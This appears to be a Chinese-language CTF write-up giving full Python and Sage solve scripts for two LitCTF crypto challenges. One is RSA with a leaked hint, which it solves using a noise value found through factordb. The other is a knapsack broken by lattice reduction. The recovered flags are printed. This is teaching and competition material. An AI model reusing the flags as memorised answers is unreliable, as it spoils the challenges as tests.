![](/images/WrcEbOq7woQ2bMxjkV5cTqJanse.png)

求出 `hint - n`，到 factordb 能查到 noise

```python
# python3.11.4
from Crypto.Util.number import *

n = 17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565066224724927142875488372745811265526082952677738164529563954987228906850399133238995317510054164641775620492640261304545177255239344267408541100183257566363663184114386155791750269054370153318333985294770328952530538998873255288249682710758780563400912097941615526239960620378046855974566511497666396320752739097426013141
e = 65537
c = 1443781085228809103260687286964643829663045712724558803386592638665188285978095387180863161962724216167963654290035919557593637853286347618612161170407578261345832596144085802169614820425769327958192208423842665197938979924635782828703591528369967294598450115818251812197323674041438116930949452107918727347915177319686431081596379288639254670818653338903424232605790442382455868513646425376462921686391652158186913416425784854067607352211587156772930311563002832095834548323381414409747899386887578746299577314595641345032692386684834362470575165392266454078129135668153486829723593489194729482511596288603515252196
hint = 17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565315879035806034866363781260326863226820493638303543900551786806420978685834963920605455531498816171226961859405498825422799670404315599803610007692517859020686506546933013150302023167306580068646104886750772590407299332549746317286972954245335810093049085813683948329319499796034424103981702702886662008367017860043529164

# print(hint - n)
noise = 942430120937
p_plus_q = (hint - n - noise**2) // noise
phi = n + 1 - p_plus_q
d = inverse(e,phi)
m = pow(c,d,n)
print(long_to_bytes(m))
# LitCTF{db6f52b9265971910b306754b9df8b76}
```

## new_bag

本题密度太大，先利用已知 flag 信息，可以将本题转换为 8 字节未知明文背包，即如下这个式子

![](/images/UNGfbDpQ6ojKHFxl65yc9uzonVf.png)

这里只需要求 64 个未知 bit，所以 k 不会特别大，可以爆破这个 k，然后用下面这个格

![](/images/YGRkbF61Ao5cn3xBXsfcgPdZnqb.png)

其中 `S = enc - known + kp`

```python
# sage10.6
from Crypto.Util.number import *
from tqdm import *

p = 173537234562263850990112795836487093439
pubkey = [184316235755254907483728080281053515467, 301753295242660201987730522100674059399, 214746865948159247109907445342727086153, 190710765981032078577562674498245824397, 331594659178887289573546882792969306963, 325241251857446530306000904015122540537, 183138087354043440402018216471847480597, 184024660891182404534278014517267677121, 221852419056451630727726571924370029193, 252122782233143392994310666727549089119, 175886223097788623718858806338121455451, 275410728642596840638045777234465661687, 251664694235514793799312335012668142813, 218645272462591891220065928162159215543, 312223630454310643034351163568776055567, 246969281206041998865813427647656760287, 314861458279166374375088099707870061461, 264293021895772608566300156292334238719, 300802209357110221724717494354120213867, 293825386566202476683406032420716750733, 280164880535680245461599240490036536891, 223138633045675121340315815489781884671, 194958151408670059556476901479795911187, 180523100489259027750075460231138785329, 180425435626797251881104654861163883059, 313871202884226454316190668965524324023, 184833541398593696671625353250714719537, 217497008601504809464374671355532403921, 246589067140439936215888566305171004301, 289015788017956436490096615142465503023, 301775305365100149653555500258867275677, 185893637147914858767269807046039030871, 319328260264390422708186053639594729851, 196198701308135383224057395173059054757, 231185775704496628532348037721799493511, 243973313872552840389840048418558528537, 213140279661565397451805047456032832611, 310386296949148370235845491986451639013, 228492979916155878048849684460007011451, 240557187581619139147592264130657066299, 187388364905654342761169670127101032713, 305292765113810142043496345097024570233, 303823809595161213886303993298011013599, 227663140954563126349665813092551336597, 257833881948992845466919654910838972461, 291249161813309696736659661907363469657, 228470133121759300620143703381920625589, 337912208888617180835513160742872043511, 252639095930536359128379880984347614689, 306613178720695137374121633131944714277, 328627523443531702430603855075960220403, 283995291614222889691668376952473718279, 185992200035693404743830210660606140043, 175575945935802771832062328390060568381, 239709736751531517044198331233711541211, 325191992201185112802734343474281930993, 285825734319916654888050222626163129503, 260820892372814862728958615462018022903, 271109638409686342632742230596810197399, 195432366301516284662210689868561107229, 252351678712166898804432075801905414141, 175869608753229067314866329908981554323, 212291732707466211705141589249474157597, 299891357045144243959903067354676661051, 271237385422923460052644584552894282763, 268702576849722796315440463412052409241, 198273535005705777854651218089804228523, 177684355989910045168511400849036259973, 189237944200991357454773904466163557789, 175427967765368330787115337317676160499, 270446056495616077936737430232108222303, 243318639972702711024520926308402316247, 223872107662231922057872197123261908053, 268995355861070998347238198063073079851, 244478236168888494353493404999149985963, 230731375083676409248450208772518041369, 231630208287176700035265642824425872113, 187649298194887119502654724235771449423, 264924369987111619306245625770849264491, 327092811483332202721992798797117253283, 274967838920225995524024619709213673571, 313836314009366857157961838519499192671, 181860768653760352435352944732117309357, 184011200837375425882494435177626368109, 246455975565763627776562816894916143559, 262208917125258935991543552004318662109, 334006940602786701813813048552124976177, 241119397420390120456580389194328607351, 255370083166310325724283692646412327547, 280056982387584554076672702548437488901, 190822826881447578202544631446213911541, 206119293866065537243159766877834200177, 289535246575130471484249052043282790337, 222004375767927951747133364917437739627, 186041951615746748538744491355290007923, 299120276948597373232905692530626175519, 268645812049699572580085139845553457511, 231990902203442306941381714523426756489, 259677531562170067444672097354970172129, 232573792063456357545735601063504090387, 268451806037215206985127877726665463011, 324266632324016349795115268035757999593, 323952615081869295386415078624753400501, 302316593553669781596237136546083536339, 235576231941572491681115931798290883659, 202271277470197960243533508432663735031, 172391954991101354275650988921310984563, 215333185856183701105529790905068832303, 335916893044781805453250006520700519353, 217268288923298532517983372665872329797, 265455575922780577837866687874732212733, 182194442259001995170676842797322170297, 180222796978664332193987060700843734759, 332629077640484670095070754759241249101, 238815683708676274248277883404136375767, 246167709707533867216616011486975023679, 188375282015595301232040104228085154549, 230675799347049231846866057019582889423, 290911573230654740468234181613682439691, 173178956820933028868714760884278201561, 340087079300305236498945763514358009773, 215775253913162994758086261347636015049, 286306008278685809877266756697807931889, 175231652202310718229276393280541484041, 230887015177563361309867021497576716609, 306478031708687513424095160106047572447, 172289054804425429042492673052057816187]
enc = 82516114905258351634653446232397085739

known = b'LitCTF{' + b'\x00'*8 + b'}'
bin_known = bin(bytes_to_long(known))[2:]
for i in range(len(bin_known)):
    enc -= pubkey[i] * int(bin_known[i])
    enc %= p

new_pubkey = pubkey[-72:-8]
n = len(new_pubkey)
d = n / log(max(new_pubkey), 2)
print(CDF(d))

for k in trange(256):
    S = enc + k*p
    L = Matrix(ZZ,n+1,n+1)
    for i in range(n):
        L[i,i] = 2
        L[-1,i] = 1
        L[i,-1] = new_pubkey[i]
    L[-1,-1] = S
    L[:,-1] *= 2^200

    for line in L.LLL():
        if set(line[:-1]).issubset({-1,1}):
            m = ''
            for i in line[:-1]:
                if i == 1:
                    m += '0'
                else:
                    m += '1'
            flag = b'LitCTF{' + long_to_bytes(int(m,2)) + b'}'
            print(flag)
            # LitCTF{Am3xItsT}
```
